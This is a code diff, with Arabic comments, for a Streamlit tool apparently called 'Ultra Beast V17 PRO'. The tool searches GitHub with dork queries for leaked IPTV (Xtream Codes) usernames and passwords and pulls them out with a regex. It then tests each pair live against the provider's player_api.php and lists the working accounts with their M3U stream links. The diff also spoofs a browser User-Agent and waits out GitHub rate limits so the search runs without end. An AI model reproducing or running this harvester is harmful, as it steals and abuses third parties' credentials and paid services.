@@ -33,7 +33,7 @@ if not check_password():
 # =================================================
 # 2. إعدادات الواجهة
 # =================================================
-st.set_page_config(page_title="Ultra Beast V17 PRO - INFINITE", layout="wide")
+st.set_page_config(page_title="Ultra Beast V17 PRO", layout="wide")
 
 st.markdown("""
 <style>
@@ -48,20 +48,21 @@ st.markdown("""
     }
     .host-text { color: #00ff41; font-weight: bold; font-family: monospace; }
     .country-tag { background: #333; color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 10px; }
+    .live-log { color: #fbbf24; font-family: monospace; font-size: 12px; }
 </style>
 """, unsafe_allow_html=True)
 
-# إدارة الحالة
 if 'results' not in st.session_state: st.session_state.results = []
 if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
 if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
 if 'seen_urls' not in st.session_state: st.session_state.seen_urls = set()
 
-# إنشاء جلسة اتصال سريعة
+# إنشاء جلسة متصفح وهمية قوية لتخطي الحماية
 if 'req_session' not in st.session_state:
     st.session_state.req_session = requests.Session()
     st.session_state.req_session.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
     })
 
 # =================================================
@@ -69,8 +70,7 @@ if 'req_session' not in st.session_state:
 # =================================================
 
 def is_valid_syntax(host, user, pw):
-    # فلتر سريع لمنع فحص السيرفرات الوهمية لتوفير الوقت
-    bad_words = ['localhost', '127.0.0.1', 'your-ip', 'domain.com', 'server.com', 'example']
+    bad_words = ['localhost', '127.0.0.1', 'your-ip', 'domain', 'example', 'server']
     bad_users = ['user', 'test', 'username', 'pass', 'password', 'x']
     if any(w in host.lower() for w in bad_words) or user.lower() in bad_users or pw.lower() in bad_users:
         return False
@@ -92,20 +92,24 @@ def check_account(host, user, pw):
 
     try:
         api_url = f"{host}/player_api.php?username={user}&password={pw}"
-        r = st.session_state.req_session.get(api_url, timeout=5).json()
-        
-        if r.get("user_info", {}).get("status") == "Active":
-            info = r["user_info"]
-            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
-            country = get_country(host)
-            m3u_link = f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
-            
-            return {
-                "host": host, "user": user, "pass": pw, 
-                "exp": exp, "conn": f"{info.get('active_cons')}/{info.get('max_connections')}",
-                "country": country, "m3u": m3u_link
-            }
-    except: return None
+        # فحص السيرفر
+        r = st.session_state.req_session.get(api_url, timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("user_info", {}).get("status") == "Active":
+                info = data["user_info"]
+                exp_date = info.get('exp_date')
+                exp = datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d') if exp_date and str(exp_date).isdigit() else "Unlimited"
+                country = get_country(host)
+                m3u_link = f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
+                
+                return {
+                    "host": host, "user": user, "pass": pw, 
+                    "exp": exp, "conn": f"{info.get('active_cons', '0')}/{info.get('max_connections', '1')}",
+                    "country": country, "m3u": m3u_link
+                }
+    except:
+        return None
     return None
 
 # =================================================
@@ -127,10 +131,9 @@ with st.sidebar:
 
     st.divider()
     
-    # واجهة الإحصائيات الحية
     stat_check = st.empty()
     stat_found = st.empty()
-    stat_check.metric("🔍 تم فحص", st.session_state.checked_count)
+    stat_check.metric("🔍 تم استخراج/فحص", st.session_state.checked_count)
     stat_found.metric("💎 صيد صالح", len(st.session_state.results))
     
     if st.session_state.results:
@@ -149,16 +152,15 @@ with st.sidebar:
 # =================================================
 # 5. منطقة العرض المباشر
 # =================================================
-st.subheader("📡 الرادار المباشر اللانهائي (V17 PRO)")
+st.subheader("📡 الرادار المباشر")
 status_log = st.empty()
+live_action = st.empty() # شاشة المراقبة الحية الجديدة
 results_area = st.empty()
 
 def render_display():
-    # تحديث العدادات الجانبية
-    stat_check.metric("🔍 تم فحص", st.session_state.checked_count)
+    stat_check.metric("🔍 تم استخراج/فحص", st.session_state.checked_count)
     stat_found.metric("💎 صيد صالح", len(st.session_state.results))
     
-    # تحديث كروت النتائج
     html_content = ""
     for item in st.session_state.results:
         html_content += f"""
@@ -178,66 +180,76 @@ def render_display():
         """
     results_area.markdown(html_content, unsafe_allow_html=True)
 
-# عرض النتائج القديمة إن وجدت
 if not st.session_state.is_hunting:
     render_display()
 
-# --- محرك البحث اللانهائي (The Infinite Harvester) ---
 if st.session_state.is_hunting:
     headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
     dorks = [
         '"player_api.php" user pass extension:txt',
         'extension:txt "get.php?username="', 
-        'filename:iptv.txt "password="', 
-        'extension:m3u "http" "password="',
-        '"http://" "user" "pass" extension:m3u'
+        '"http://" "password=" extension:m3u',
+        'xtream codes iptv 2026'
     ]
     
-    # حلقة لا نهائية (لن يتوقف البرنامج إلا بضغطك على زر الإيقاف)
     while st.session_state.is_hunting:
         for dork in dorks:
             if not st.session_state.is_hunting: break
             
-            for page in range(1, 15): # رفعنا عدد الصفحات لـ 15
+            for page in range(1, 15):
                 if not st.session_state.is_hunting: break
                 
-                status_log.info(f"🔎 جاري فحص الرادار المستمر: {dork} | صفحة {page}")
+                status_log.info(f"🔎 جاري مسح جيت هاب: {dork} | صفحة {page}")
+                live_action.markdown("<span class='live-log'>⏳ بانتظار استجابة جيت هاب...</span>", unsafe_allow_html=True)
                 
                 try:
                     url = f"https://api.github.com/search/code?q={dork}&per_page=100&page={page}"
-                    res = st.session_state.req_session.get(url, headers=headers).json()
+                    res = requests.get(url, headers=headers).json()
                     
-                    # نظام الحماية من حظر جيت هاب (لن يتوقف أبداً)
-                    if "message" in res and ("rate limit" in res["message"].lower() or "abuse" in res["message"].lower()):
-                        status_log.warning("⏳ الرادار يبرد محركاته (تخطي حظر جيت هاب)... سيستأنف الصيد بعد 30 ثانية.")
-                        time.sleep(30)
-                        continue # سيعيد المحاولة دون أن يغلق البرنامج
+                    if "message" in res and "rate limit" in res["message"].lower():
+                        status_log.warning("⏳ جيت هاب يطلب الانتظار (Rate Limit)... سيستأنف بعد 20 ثانية.")
+                        for i in range(20, 0, -1):
+                            if not st.session_state.is_hunting: break
+                            live_action.markdown(f"<span class='live-log'>العد التنازلي: {i} ثانية...</span>", unsafe_allow_html=True)
+                            time.sleep(1)
+                        continue 
                     
                     items = res.get('items', [])
-                    if not items: break # إذا فرغت الصفحة انتقل للدورك الذي يليه
+                    if not items: 
+                        live_action.markdown("<span class='live-log'>⚠️ الصفحة فارغة، جاري الانتقال...</span>", unsafe_allow_html=True)
+                        break 
                     
                     for item in items:
                         if not st.session_state.is_hunting: break
                         raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                         
                         try:
-                            content = st.session_state.req_session.get(raw_url, timeout=4).text
-                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
+                            # جلب محتوى الملف
+                            content = requests.get(raw_url, timeout=4).text
+                            # Regex مطور جداً لصيد السيرفرات
+                            matches = re.findall(r"(http[s]?://[a-zA-Z0-9\.\-]+:\d+)[^\"'\s]*\?username=([^&\"'\s]+)&password=([^&\"'\s]+)", content)
                             
                             for m in matches:
+                                host, user, pwd = m[0], m[1], m[2]
+                                
+                                # عرض السيرفر الذي يتم فحصه حالياً على الشاشة
+                                live_action.markdown(f"<span class='live-log'>⚡ يتم الآن فحص: {host} | {user}</span>", unsafe_allow_html=True)
+                                
                                 st.session_state.checked_count += 1
-                                # فحص الحساب لايف للتأكد أنه يعمل
-                                found = check_account(m[0], m[1], m[2])
+                                render_display() # لتحديث العداد
+                                
+                                found = check_account(host, user, pwd)
                                 if found:
                                     st.session_state.results.insert(0, found)
                                     render_display()
-                        except: continue
+                        except Exception as e:
+                            continue
                     
-                    time.sleep(3) # راحة بسيطة بين الصفحات لعدم إغضاب السيرفرات
+                    time.sleep(2)
                 except Exception as e:
+                    live_action.markdown(f"<span class='live-log'>❌ خطأ في الاتصال: {e}</span>", unsafe_allow_html=True)
                     time.sleep(5)
                     continue
                 
-        # استراحة بسيطة قبل إعادة دورة البحث من جديد
-        status_log.success("🔄 تم مسح جميع الكلمات، جاري إعادة تدوير الرادار للبحث عن تسريبات جديدة...")
-        time.sleep(10)
+        status_log.success("🔄 تم مسح جميع الكلمات، جاري إعادة تدوير الرادار...")
+        time.sleep(5)
